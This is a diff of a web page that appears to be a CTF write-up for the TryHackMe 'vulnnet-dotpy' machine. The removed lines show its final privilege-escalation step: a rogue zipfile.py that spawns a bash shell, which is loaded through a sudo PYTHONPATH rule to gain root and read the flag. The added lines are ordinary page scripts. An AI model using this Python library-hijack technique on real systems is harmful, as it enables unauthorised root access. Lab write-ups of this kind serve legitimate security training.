@@ -204,22 +204,9 @@ User system-adm may run the following commands on vulnnet-dotpy:
 </ol>
 <ol>
 <li></li>
-</ol>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>system-adm@vulnnet-dotpy:~$ echo <span style=color:#e6db74>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span> &gt; /tmp/zipfile.py
-system-adm@vulnnet-dotpy:~$ cat /tmp/zipfile.py 
-import pty; pty.spawn<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span><span style=color:#f92672>)</span>
-</code></pre></div><ol start=2>
 <li></li>
 </ol>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>system-adm@vulnnet-dotpy:~$ sudo PYTHONPATH<span style=color:#f92672>=</span>/tmp/ /usr/bin/python3 /opt/backup.py
-root@vulnnet-dotpy:/home/system-adm# id
-uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
-root@vulnnet-dotpy:/home/system-adm# whoami
-root
-root@vulnnet-dotpy:/home/system-adm# cat /root/root.txt 
-THM<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
-root@vulnnet-dotpy:/home/system-adm# 
-</code></pre></div><p>And we rooted the machine!</p>
+<p>And we rooted the machine!</p>
 <p>That&rsquo;s all from my side, hope you find this helpful!</p>
 </div>
 <div class=pagination>
@@ -253,7 +240,10 @@ root@vulnnet-dotpy:/home/system-adm#
 </div>
 </footer>
 <script src=/assets/main.js></script>
-<script src=/assets/prism.js></script>
+<script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
+<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script>
+<script type=module src=/assets/ionicons/ionicons.esm.js></script>
+<script nomodule src=/assets/ionicons/ionicons.js></script>
 </div>
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
 <script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
